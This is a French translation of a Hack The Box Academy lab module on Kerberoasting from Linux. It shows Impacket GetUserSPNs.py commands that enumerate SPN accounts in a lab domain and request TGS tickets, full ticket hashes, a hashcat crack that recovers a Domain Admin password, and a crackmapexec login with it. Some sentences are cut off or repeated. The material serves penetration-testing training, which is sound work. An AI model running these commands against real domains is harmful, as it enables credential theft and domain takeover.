Kerberoasting - à partir de Linux
=================================

* * * * *

Notre énumération jusqu'à présent nous a donné une vue d'ensemble du domaine et des problèmes potentiels. Nous avons énuméré les comptes d'utilisateurs et pouvons voir que certains sont configurés avec des noms principaux de service. Voyons comment nous pouvons tirer parti de cela pour nous déplacer latéralement et augmenter les privilèges dans le domaine cible.

* * * * *

Présentation de Kerberoasting
-----------------------------

Kerberoasting est une technique de mouvement latéral/d'escalade de privilèges dans les environnements Active Directory. Cette attaque cible les comptes [SPN (Service Principal Names)](https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names) . Les SPN sont des identifiants uniques que Kerberos utilise pour mapper une instance de service à un compte de service dans le contexte duquel le service s'exécute. Les comptes de domaine sont souvent utilisés pour exécuter des services afin de surmonter les limitations d'authentification réseau des comptes intégrés tels que`NT AUTHORITY\LOCAL SERVICE`. Tout utilisateur de domaine peut demander un ticket Kerberos pour n'importe quel compte de service dans le même domaine. Cela est également possible entre les approbations de forêt si l'authentification est autorisée à travers la limite d'approbation. Tout ce dont vous avez besoin pour effectuer une attaque Kerberoasting est le mot de passe en texte clair d'un compte (ou hachage NTLM), un shell dans le contexte d'un compte d'utilisateur de domaine ou un accès au niveau SYSTEM sur un hôte joint à un domaine.

Les comptes de domaine exécutant des services sont souvent des administrateurs locaux, voire des comptes de domaine hautement privilégiés. En raison de la nature distribuée des systèmes, des services en interaction et des transferts de données associés, les comptes de service peuvent se voir accorder des privilèges d'administrateur sur plusieurs serveurs de l'entreprise. De nombreux services nécessitent des privilèges élevés sur divers systèmes, de sorte que les comptes de service sont souvent ajoutés à des groupes privilégiés, tels que les administrateurs de domaine, soit directement, soit via une adhésion imbriquée. Il est très courant de trouver des SPN associés à des comptes hautement privilégiés dans un environnement Windows. La récupération d'un ticket Kerberos pour un compte avec un SPN ne permet pas en soi d'exécuter des commandes dans le contexte de ce compte. Cependant, le ticket (TGS-REP) est chiffré avec le hachage NTLM du compte de service,

Les comptes de service sont souvent configurés avec un mot de passe faible ou réutilisé pour simplifier l'administration, et parfois le mot de passe est le même que le nom d'utilisateur. Si le mot de passe d'un compte de service SQL Server de domaine est piraté, vous risquez de vous retrouver en tant qu'administrateur local sur plusieurs serveurs, sinon administrateur de domaine. Même si le craquage d'un ticket obtenu via une attaque Kerberoasting donne un compte utilisateur à faible privilège, nous pouvons l'utiliser pour créer des tickets de service pour le service spécifié dans le SPN. Par exemple, si le SPN est défini sur MSSQL/SRV01, nous pouvons accéder au service MSSQL en tant qu'administrateur système, activer la procédure étendue xp_cmdshell et obtenir l'exécution du code sur le serveur SQL cible.

Pour un regard intéressant sur l'origine de cette technique, consultez la [conférence](https://youtu.be/PUyhlN-E5MU) que Tim Medin a donnée au Derbycon 2014, présentant Kerberoasting au monde.

* * * * *

Kerberoasting - Exécution de l'attaque
--------------------------------------

Selon votre position dans un réseau, cette attaque peut être effectuée de plusieurs manières :

-   À partir d'un hôte Linux n'appartenant pas à un domaine à l'aide d'informations d'identification d'utilisateur de domaine valides.
-   À partir d'un hôte Linux joint à un domaine en tant que racine après avoir récupéré le fichier keytab.
-   À partir d'un hôte Windows joint à un domaine authentifié en tant qu'utilisateur de domaine.
-   À partir d'un hôte Windows joint à un domaine avec un shell dans le contexte d'un compte de domaine.
-   En tant que SYSTEM sur un hôte Windows joint à un domaine.
-   À partir d'un hôte Windows non joint à un domaine à l'aide de [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)) /netonly.

Plusieurs outils peuvent être utilisés pour effectuer l'attaque :

-   [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) d'Impacket à partir d'un hôte Linux non joint à un domaine.
-   Une combinaison du binaire Windows setspn.exe intégré, de PowerShell et de Mimikatz.
-   Depuis Windows, en utilisant des outils tels que PowerView, [Rubeus](https://github.com/GhostPack/Rubeus) et d'autres scripts PowerShell.

L'obtention d'un ticket TGS via Kerberoasting ne vous garantit pas un ensemble d'informations d'identification valides, et le ticket doit toujours être `cracked`hors ligne avec un outil tel que Hashcat pour obtenir le mot de passe en clair. Les tickets TGS prennent plus de temps à se fissurer que d'autres formats tels que les hachages NTLM, si souvent, à moins qu'un mot de passe faible ne soit défini, il peut être difficile, voire impossible, d'obtenir le texte en clair à l'aide d'une plate-forme de craquage standard.

* * * * *

Efficacité de l'attaque
-----------------------

Bien que cela puisse être un excellent moyen de se déplacer latéralement ou d'augmenter les privilèges dans un domaine, Kerberoasting et la présence de SPN ne nous garantissent aucun niveau d'accès. Nous pouvons être dans un environnement où nous craquons un ticket TGS et obtenons immédiatement un accès administrateur de domaine ou obtenons des informations d'identification qui nous aident à avancer sur la voie de la compromission de domaine. D'autres fois, nous pouvons effectuer l'attaque et récupérer de nombreux tickets TGS, dont certains que nous pouvons craquer, mais aucun de ceux qui craquent n'est destiné aux utilisateurs privilégiés, et l'attaque ne nous donne aucun accès supplémentaire. J'écrirais probablement la découverte comme étant à haut risque dans mon rapport dans les deux premiers cas. Dans le troisième cas, nous pouvons Kerberoast et nous retrouver incapables de casser un seul ticket TGS, même après des jours de tentatives de cassage avec Hashcat sur une puissante plate-forme de cassage de mot de passe GPU. Dans ce scénario, Je rédigerais toujours la conclusion, mais je la réduirais à un problème à risque moyen pour informer le client du risque de SPN dans le domaine (ces mots de passe forts pourraient toujours être remplacés par quelque chose de plus faible ou un attaquant très déterminé peut être capable de casser les tickets en utilisant Hashcat), mais tenez compte du fait que je n'ai pu prendre le contrôle d'aucun compte de domaine utilisant l'attaque. Il est essentiel de faire ces types de distinctions dans nos rapports et de savoir quand il est acceptable de réduire le risque de découverte lorsque des contrôles atténuants (tels que des mots de passe très forts) sont en place. mais tenez compte du fait que je n'ai pu prendre le contrôle d'aucun compte de domaine utilisant l'attaque. Il est essentiel de faire ces types de distinctions dans nos rapports et de savoir quand il est acceptable de réduire le risque de découverte lorsque des contrôles atténuants (tels que des mots de passe très forts) sont en place. mais tenez compte du fait que je n'ai pu prendre le contrôle d'aucun compte de domaine utilisant l'attaque. Il est essentiel de faire ces types de distinctions dans nos rapports et de savoir quand il est acceptable de réduire le risque de découverte lorsque des contrôles atténuants (tels que des mots de passe très forts) sont en place.

* * * * *

Effectuer l'attaque
-------------------

Les attaques Kerberoasting se font désormais facilement à l'aide d'outils et de scripts automatisés. Nous couvrirons l'exécution de cette attaque de différentes manières, à la fois à partir d'un hôte d'attaque Linux et Windows. Voyons d'abord comment procéder à partir d'un hôte Linux. La section suivante décrit une manière "semi-manuelle" d'effectuer l'attaque et deux attaques rapides et automatisées à l'aide d'outils open source courants, le tout à partir d'un hôte d'attaque Windows.

* * * * *

Kerberoasting avec GetUserSPNs.py
---------------------------------

Une condition préalable à l'exécution d'attaques Kerberoasting est soit les informations d'identification de l'utilisateur de domaine (texte clair ou simplement un hachage NTLM si vous utilisez Impacket), un shell dans le contexte d'un utilisateur de domaine ou un compte tel que SYSTEM. Une fois que nous avons ce niveau d'accès, nous pouvons commencer. Nous devons également savoir quel hôte du domaine est un contrôleur de domaine afin de pouvoir l'interroger.

Commençons par installer la boîte à outils Impacket, que nous pouvons récupérer [ici](https://github.com/SecureAuthCorp/impacket) . Après avoir cloné le référentiel, nous pouvons cd dans le répertoire et l'installer comme suit :

#### Installation d'Impacket avec Pip

  Installation d'Impacket avec Pip

```
dsgsec@htb[/htb]$ sudo python3 -m pip install .

Processing /opt/impacket
  Preparing metadata (setup.py) ... done
Requirement already satisfied: chardet in /usr/lib/python3/dist-packages (from impacket==0.9.25.dev1+20220208.122405.769c3196) (4.0.0)
Requirement already satisfied: flask>=1.0 in /usr/lib/python3/dist-packages (from impacket==0.9.25.dev1+20220208.122405.769c3196) (1.1.2)
Requirement already satisfied: future in /usr/lib/python3/dist-packages (from impacket==0.9.25.dev1+20220208.122405.769c3196) (0.18.2)
Requirement already satisfied: ldap3!=2.5.0,!=2.5.2,!=2.6,>=2.5 in /usr/lib/python3/dist-packages (from impacket==0.9.25.dev1+20220208.122405.769c3196) (2.8.1)
Requirement already satisfied: ldapdomaindump>=0.9.0 in /usr/lib/python3/dist-packages (from impacket==0.9.25.dev1+20220208.122405.769c3196) (0.9.3)

<SNIP>

```

Cela installera tous les outils Impacket et les placera dans notre PATH afin que nous puissions les appeler depuis n'importe quel répertoire sur notre hôte d'attaque. Impacket est déjà installé sur l'hôte d'attaque que nous pouvons générer à la fin de cette section pour suivre et travailler sur les exercices. L'exécution de l'outil avec le `-h`drapeau fera apparaître le menu d'aide.

#### Liste des options d'aide de GetUserSPNs.py

  Liste des options d'aide de GetUserSPNs.py

```
dsgsec@htb[/htb]$ GetUserSPNs.py -h

Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation

usage: GetUserSPNs.py [-h] [-target-domain TARGET_DOMAIN]
                      [-usersfile USERSFILE] [-request]
                      [-request-user username] [-save]
                      [-outputfile OUTPUTFILE] [-debug]
                      [-hashes LMHASH:NTHASH] [-no-pass] [-k]
                      [-aesKey hex key] [-dc-ip ip address]
                      target

Queries target domain for SPNs that are running under a user account

positional arguments:
  target                domain/username[:password]

<SNIP>

```

Nous pouvons commencer par simplement rassembler une liste de SPN dans le domaine. Pour ce faire, nous aurons besoin d'un ensemble d'informations d'identification de domaine valides et de l'adresse IP d'un contrôleur de domaine. Nous pouvons nous authentifier auprès du contrôleur de domaine avec un mot de passe en clair, un hachage de mot de passe NT ou même un ticket Kerberos. Pour nos besoins, nous utiliserons un mot de passe. La saisie de la commande ci-dessous générera une invite d'informations d'identification, puis une liste bien formatée de tous les comptes SPN. D'après la sortie ci-dessous, nous pouvons voir que plusieurs comptes sont membres du groupe Administrateurs du domaine. Si nous pouvons récupérer et casser l'un de ces tickets, cela pourrait entraîner une compromission du domaine. Il vaut toujours la peine d'enquêter sur l'appartenance au groupe de tous les comptes, car nous pouvons trouver un compte avec un ticket facile à pirater qui peut nous aider à poursuivre notre objectif de déplacement latéral/vertical dans le domaine cible.

#### Liste des comptes SPN avec GetUserSPNs.py

  Liste des comptes SPN avec GetUserSPNs.py

```
dsgsec@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend

Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                           Name               MemberOf                                                                                  PasswordLastSet             LastLogon  Delegation
---------------------------------------------  -----------------  ----------------------------------------------------------------------------------------  --------------------------  ---------  ----------
backupjob/veam001.inlanefreight.local          BACKUPAGENT        CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:15:40.842452  <never>
sts/inlanefreight.local                        SOLARWINDSMONITOR  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:14:48.701834  <never>
MSSQLSvc/SPSJDB.inlanefreight.local:1433       sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:09:46.326865  <never>
MSSQLSvc/SQL-CL01-01inlanefreight.local:49351  sqlqa              CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:10:06.545598  <never>
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:13:31.639334  <never>
adfsconnect/azure01.inlanefreight.local        adfs               CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:15:27.108079  <never>

```

Nous pouvons maintenant extraire tous les tickets TGS pour un traitement hors ligne en utilisant le `-request`drapeau. Les tickets TGS seront générés dans un format qui peut être facilement fourni à Hashcat ou John the Ripper pour les tentatives de craquage de mot de passe hors ligne.

#### Demander tous les billets TGS

  Demander tous les billets TGS

```
dsgsec@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request

Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                           Name               MemberOf                                                                                  PasswordLastSet             LastLogon  Delegation
---------------------------------------------  -----------------  ----------------------------------------------------------------------------------------  --------------------------  ---------  ----------
backupjob/veam001.inlanefreight.local          BACKUPAGENT        CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:15:40.842452  <never>
sts/inlanefreight.local                        SOLARWINDSMONITOR  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:14:48.701834  <never>
MSSQLSvc/SPSJDB.inlanefreight.local:1433       sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:09:46.326865  <never>
MSSQLSvc/SQL-CL01-01inlanefreight.local:49351  sqlqa              CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:10:06.545598  <never>
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:13:31.639334  <never>
adfsconnect/azure01.inlanefreight.local        adfs               CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:15:27.108079  <never>

$krb5tgs$23$*BACKUPAGENT$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/BACKUPAGENT*$790ae75fc53b0ace5daeb5795d21b8fe$b6be1ba275e23edd3b7dd3ad4d711c68f9170bac85e722cc3d94c80c5dca6bf2f07ed3d3bc209e9a6ff0445cab89923b26a01879a53249c5f0a8c4bb41f0ea1b1196c322640d37ac064ebe3755ce888947da98b5707e6b06cbf679db1e7bbbea7d10c36d27f976d3f9793895fde20d3199411a90c528a51c91d6119cb5835bd29457887dd917b6c621b91c2627b8dee8c2c16619dc2a7f6113d2e215aef48e9e4bba8deff329a68666976e55e6b3af0cb8184e5ea6c8c2060f8304bb9e5f5d930190e08d03255954901dc9bb12e53ef87ed603eb2247d907c3304345b5b481f107cefdb4b01be9f4937116016ef4bbefc8af2070d039136b79484d9d6c7706837cd9ed4797ad66321f2af200bba66f65cac0584c42d900228a63af39964f02b016a68a843a81f562b493b29a4fc1ce3ab47b934cbc1e29545a1f0c0a6b338e5ac821fec2bee503bc56f6821945a4cdd24bf355c83f5f91a671bdc032245d534255aac81d1ef318d83e3c52664cfd555d24a632ee94f4adeb258b91eda3e57381dba699f5d6ec7b9a8132388f2346d33b670f1874dfa1e8ee13f6b3421174a61029962628f0bc84fa0c3c6d7bbfba8f2d1900ef9f7ed5595d80edc7fc6300385f9aa6ce1be4c5b8a764c5b60a52c7d5bbdc4793879bfcd7d1002acbe83583b5a995cf1a4bbf937904ee6bb537ee00d99205ebf5f39c722d24a910ae0027c7015e6daf73da77af1306a070fdd50aed472c444f5496ebbc8fe961fee9997651daabc0ef0f64d47d8342a499fa9fb8772383a0370444486d4142a33bc45a54c6b38bf55ed613abbd0036981dabc88cc88a5833348f293a88e4151fbda45a28ccb631c847da99dd20c6ea4592432e0006ae559094a4c546a8e0472730f0287a39a0c6b15ef52db6576a822d6c9ff06b57cfb5a2abab77fd3f119caaf74ed18a7d65a47831d0657f6a3cc476760e7f71d6b7cf109c5fe29d4c0b0bb88ba963710bd076267b889826cc1316ac7e6f541cecba71cb819eace1e2e2243685d6179f6fb6ec7cfcac837f01989e7547f1d6bd6dc772aed0d99b615ca7e44676b38a02f4cb5ba8194b347d7f21959e3c41e29a0ad422df2a0cf073fcfd37491ac062df903b77a32101d1cb060efda284cae727a2e6cb890f4243a322794a97fc285f04ac6952aa57032a0137ad424d231e15b051947b3ec0d7d654353c41d6ad30c6874e5293f6e25a95325a3e164abd6bc205e5d7af0b642837f5af9eb4c5bca9040ab4b999b819ed6c1c4645f77ae45c0a5ae5fe612901c9d639392eaac830106aa249faa5a895633b20f553593e3ff01a9bb529ff036005ec453eaec481b7d1d65247abf62956366c0874493cf16da6ffb9066faa5f5bc1db5bbb51d9ccadc6c97964c7fe1be2fb4868f40b3b59fa6697443442fa5cebaaed9db0f1cb8476ec96bc83e74ebe51c025e14456277d0a7ce31e8848d88cbac9b57ac740f4678f71a300b5f50baa6e6b85a3b10a10f44ec7f708624212aeb4c60877322268acd941d590f81ffc7036e2e455e941e2cfb97e33fec5055284ae48204d
$krb5tgs$23$*SOLARWINDSMONITOR$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/SOLARWINDSMONITOR*$993de7a8296f2a3f2fa41badec4215e1$d0fb2166453e4f2483735b9005e15667dbfd40fc9f8b5028e4b510fc570f5086978371ecd81ba6790b3fa7ff9a007ee9040f0566f4aed3af45ac94bd884d7b20f87d45b51af83665da67fb394a7c2b345bff2dfe7fb72836bb1a43f12611213b19fdae584c0b8114fb43e2d81eeee2e2b008e993c70a83b79340e7f0a6b6a1dba9fa3c9b6b02adde8778af9ed91b2f7fa85dcc5d858307f1fa44b75f0c0c80331146dfd5b9c5a226a68d9bb0a07832cc04474b9f4b4340879b69e0c4e3b6c0987720882c6bb6a52c885d1b79e301690703311ec846694cdc14d8a197d8b20e42c64cc673877c0b70d7e1db166d575a5eb883f49dfbd2b9983dd7aab1cff6a8c5c32c4528e798237e837ffa1788dca73407aac79f9d6f74c6626337928457e0b6bbf666a0778c36cba5e7e026a177b82ed2a7e119663d6fe9a7a84858962233f843d784121147ef4e63270410640903ea261b04f89995a12b42a223ed686a4c3dcb95ec9b69d12b343231cccfd29604d6d777939206df4832320bdd478bda0f1d262be897e2dcf51be0a751490350683775dd0b8a175de4feb6cb723935f5d23f7839c08351b3298a6d4d8530853d9d4d1e57c9b220477422488c88c0517fb210856fb603a9b53e734910e88352929acc00f82c4d8f1dd783263c04aff6061fb26f3b7a475536f8c0051bd3993ed24ff22f58f7ad5e0e1856a74967e70c0dd511cc52e1d8c2364302f4ca78d6750aec81dfdea30c298126987b9ac867d6269351c41761134bc4be67a8b7646935eb94935d4121161de68aac38a740f09754293eacdba7dfe26ace6a4ea84a5b90d48eb9bb3d5766827d89b4650353e87d2699da312c6d0e1e26ec2f46f3077f13825764164368e26d58fc55a358ce979865cc57d4f34691b582a3afc18fe718f8b97c44d0b812e5deeed444d665e847c5186ad79ae77a5ed6efab1ed9d863edb36df1a5cd4abdbf7f7e872e3d5fa0bf7735348744d4fc048211c2e7973839962e91db362e5338da59bc0078515a513123d6c5537974707bdc303526437b4a4d3095d1b5e0f2d9db1658ac2444a11b59ddf2761ce4c1e5edd92bcf5cbd8c230cb4328ff2d0e2813b4654116b4fda929a38b69e3f9283e4de7039216f18e85b9ef1a59087581c758efec16d948accc909324e94cad923f2487fb2ed27294329ed314538d0e0e75019d50bcf410c7edab6ce11401adbaf5a3a009ab304d9bdcb0937b4dcab89e90242b7536644677c62fd03741c0b9d090d8fdf0c856c36103aedfd6c58e7064b07628b58c3e086a685f70a1377f53c42ada3cb7bb4ba0a69085dec77f4b7287ca2fb2da9bcbedc39f50586bfc9ec0ac61b687043afa239a46e6b20aacb7d5d8422d5cacc02df18fea3be0c0aa0d83e7982fc225d9e6a2886dc223f6a6830f71dabae21ff38e1722048b5788cd23ee2d6480206df572b6ba2acfe1a5ff6bee8812d585eeb4bc8efce92fd81aa0a9b57f37bf3954c26afc98e15c5c90747948d6008c80b620a1ec54ded2f3073b4b09ee5cc233bf7368427a6af0b1cb1276ebd85b45a30

<SNIP>

```

Nous pouvons également être plus ciblés et demander uniquement le ticket TGS pour un compte spécifique. Essayons d'en demander un pour le `sqldev`compte uniquement.

#### Demander un billet TGS Unique

  Demander un billet TGS Unique

```
dsgsec@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev

Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                           Name    MemberOf                                             PasswordLastSet             LastLogon  Delegation
---------------------------------------------  ------  ---------------------------------------------------  --------------------------  ---------  ----------
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:13:31.639334  <never>

$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqldev*$4ce5b71188b357b26032321529762c8a$1bdc5810b36c8e485ba08fcb7ab273f778115cd17734ec65be71f5b4bea4c0e63fa7bb454fdd5481e32f002abff9d1c7827fe3a75275f432ebb628a471d3be45898e7cb336404e8041d252d9e1ebef4dd3d249c4ad3f64efaafd06bd024678d4e6bdf582e59c5660fcf0b4b8db4e549cb0409ebfbd2d0c15f0693b4a8ddcab243010f3877d9542c790d2b795f5b9efbcfd2dd7504e7be5c2f6fb33ee36f3fe001618b971fc1a8331a1ec7b420dfe13f67ca7eb53a40b0c8b558f2213304135ad1c59969b3d97e652f55e6a73e262544fe581ddb71da060419b2f600e08dbcc21b57355ce47ca548a99e49dd68838c77a715083d6c26612d6c60d72e4d421bf39615c1f9cdb7659a865eecca9d9d0faf2b77e213771f1d923094ecab2246e9dd6e736f83b21ee6b352152f0b3bbfea024c3e4e5055e714945fe3412b51d3205104ba197037d44a0eb73e543eb719f12fd78033955df6f7ebead5854ded3c8ab76b412877a5be2e7c9412c25cf1dcb76d854809c52ef32841269064661931dca3c2ba8565702428375f754c7f2cada7c2b34bbe191d60d07111f303deb7be100c34c1c2c504e0016e085d49a70385b27d0341412de774018958652d80577409bff654c00ece80b7975b7b697366f8ae619888be243f0e3237b3bc2baca237fb96719d9bc1db2a59495e9d069b14e33815cafe8a8a794b88fb250ea24f4aa82e896b7a68ba3203735ec4bca937bceac61d31316a43a0f1c2ae3f48cbcbf294391378ffd872cf3721fe1b427db0ec33fd9e4dfe39c7cbed5d70b7960758a2d89668e7e855c3c493def6aba26e2846b98f65b798b3498af7f232024c119305292a31ae121a3472b0b2fcaa3062c3d93af234c9e24d605f155d8e14ac11bb8f810df400604c3788e3819b44e701f842c52ab302c7846d6dcb1c75b14e2c9fdc68a5deb5ce45ec9db7318a80de8463e18411425b43c7950475fb803ef5a56b3bb9c062fe90ad94c55cdde8ec06b2e5d7c64538f9c0c598b7f4c3810ddb574f689563db9591da93c879f5f7035f4ff5a6498ead489fa7b8b1a424cc37f8e86c7de54bdad6544ccd6163e650a5043819528f38d64409cb1cfa0aeb692bdf3a130c9717429a49fff757c713ec2901d674f80269454e390ea27b8230dec7fffb032217955984274324a3fb423fb05d3461f17200dbef0a51780d31ef4586b51f130c864db79796d75632e539f1118318db92ab54b61fc468eb626beaa7869661bf11f0c3a501512a94904c596652f6457a240a3f8ff2d8171465079492e93659ec80e2027d6b1865f436a443b4c16b5771059ba9b2c91e871ad7baa5355d5e580a8ef05bac02cf135813b42a1e172f873bb4ded2e95faa6990ce92724bcfea6661b592539cd9791833a83e6116cb0ea4b6db3b161ac7e7b425d0c249b3538515ccfb3a993affbd2e9d247f317b326ebca20fe6b7324ffe311f225900e14c62eb34d9654bb81990aa1bf626dec7e26ee2379ab2f30d14b8a98729be261a5977fefdcaaa3139d4b82a056322913e7114bc133a6fc9cd74b96d4d6a2

```

Avec ce ticket en main, nous pourrions tenter de casser le mot de passe de l'utilisateur hors ligne en utilisant Hashcat. Si nous réussissons, nous pourrions nous retrouver avec des droits d'administrateur de domaine.

Pour faciliter le craquage hors ligne, il est toujours bon d'utiliser le `-outputfile`drapeau pour écrire les tickets TGS dans un fichier qui peut ensuite être exécuté à l'aide de Hashcat sur notre système d'attaque ou déplacé vers une plate-forme de craquage GPU.

#### Enregistrement du ticket TGS dans un fichier de sortie

  Enregistrement du ticket TGS dans un fichier de sortie

```
dsgsec@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs

Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                           Name    MemberOf                                             PasswordLastSet             LastLogon  Delegation
---------------------------------------------  ------  ---------------------------------------------------  --------------------------  ---------  ----------
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:13:31.639334  <never>

```

Ici, nous avons écrit le ticket TGS pour l' `sqldev`utilisateur dans un fichier nommé `sqldev_tgs`. Nous pouvons maintenant tenter de déchiffrer le ticket hors ligne en utilisant le mode de hachage Hashcat `13100`.

#### Casser le ticket hors ligne avec Hashcat

  Casser le ticket hors ligne avec Hashcat

```
dsgsec@htb[/htb]$ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqldev*$81f3efb5827a05f6ca196990e67bf751$f0f5fc941f17458eb17b01df6eeddce8a0f6b3c605112c5a71d5f66b976049de4b0d173100edaee42cb68407b1eca2b12788f25b7fa3d06492effe9af37a8a8001c4dd2868bd0eba82e7d8d2c8d2e3cf6d8df6336d0fd700cc563c8136013cca408fec4bd963d035886e893b03d2e929a5e03cf33bbef6197c8b027830434d16a9a931f748dede9426a5d02d5d1cf9233d34bb37325ea401457a125d6a8ef52382b94ba93c56a79f78cb26ffc9ee140d7bd3bdb368d41f1668d087e0e3b1748d62dfa0401e0b8603bc360823a0cb66fe9e404eada7d97c300fde04f6d9a681413cc08570abeeb82ab0c3774994e85a424946def3e3dbdd704fa944d440df24c84e67ea4895b1976f4cda0a094b3338c356523a85d3781914fc57aba7363feb4491151164756ecb19ed0f5723b404c7528ebf0eb240be3baa5352d6cb6e977b77bce6c4e483cbc0e4d3cb8b1294ff2a39b505d4158684cd0957be3b14fa42378842b058dd2b9fa744cee4a8d5c99a91ca886982f4832ad7eb52b11d92b13b5c48942e31c82eae9575b5ba5c509f1173b73ba362d1cde3bbd5c12725c5b791ce9a0fd8fcf5f8f2894bc97e8257902e8ee050565810829e4175accee78f909cc418fd2e9f4bd3514e4552b45793f682890381634da504284db4396bd2b68dfeea5f49e0de6d9c6522f3a0551a580e54b39fd0f17484075b55e8f771873389341a47ed9cf96b8e53c9708ca4fc134a8cf38f05a15d3194d1957d5b95bb044abbb98e06ccd77703fa5be4aacc1a669fe41e66b69406a553d90efe2bb43d398634aff0d0b81a7fd4797a953371a5e02e25a2dd69d16b19310ac843368e043c9b271cab112981321c28bfc452b936f6a397e8061c9698f937e12254a9aadf231091be1bd7445677b86a4ebf28f5303b11f48fb216f9501667c656b1abb6fc8c2d74dc0ce9f078385fc28de7c17aa10ad1e7b96b4f75685b624b44c6a8688a4f158d84b08366dd26d052610ed15dd68200af69595e6fc4c76fc7167791b761fb699b7b2d07c120713c7c797c3c3a616a984dbc532a91270bf167b4aaded6c59453f9ffecb25c32f79f4cd01336137cf4eee304edd205c0c8772f66417325083ff6b385847c6d58314d26ef88803b66afb03966bd4de4d898cf7ce52b4dd138fe94827ca3b2294498dbc62e603373f3a87bb1c6f6ff195807841ed636e3ed44ba1e19fbb19bb513369fca42506149470ea972fccbab40300b97150d62f456891bf26f1828d3f47c4ead032a7d3a415a140c32c416b8d3b1ef6ed95911b30c3979716bda6f61c946e4314f046890bc09a017f2f4003852ef1181cec075205c460aea0830d9a3a29b11e7c94fffca0dba76ba3ba1f0577306555b2cbdf036c5824ccffa1c880e2196c0432bc46da9695a925d47febd3be10104dd86877c90e02cb0113a38ea4b7e4483a7b18b15587524d236d5c67175f7142cc75b1ba05b2395e4e85262365044d272876f500cb511001850a390880d824aec2c452c727beab71f56d8189440ecc3915c148a38eac06dbd27fe6817ffb1404c1f:database!

Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIG...404c1f
Time.Started.....: Tue Feb 15 17:45:29 2022, (10 secs)
Time.Estimated...: Tue Feb 15 17:45:39 2022, (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   821.3 kH/s (11.88ms) @ Accel:64 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 8765440/14344386 (61.11%)
Rejected.........: 0/8765440 (0.00%)
Restore.Point....: 8749056/14344386 (60.99%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: davius07 -> darten170

Started: Tue Feb 15 17:44:49 2022
Stopped: Tue Feb 15 17:45:41 2022

```

![image](https://academy.hackthebox.com/storage/modules/143/hashcat_tgs.png)

Nous avons réussi à déchiffrer le mot de passe de l'utilisateur en tant que `database!`. Comme dernière étape, nous pouvons confirmer notre accès et voir que nous avons effectivement des droits d'administrateur de domaine car nous pouvons nous authentifier auprès du DC cible dans le domaine INLANEFREIGHT.LOCAL. À partir de là, nous pourrions effectuer la post-exploitation et continuer à énumérer le domaine pour d'autres chemins de compromis et d'autres défauts et erreurs de configuration notables.

#### Test de l'authentification auprès d'un contrôleur de domaine

  Test de l'authentification auprès d'un contrôleur de domaine

```
dsgsec@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
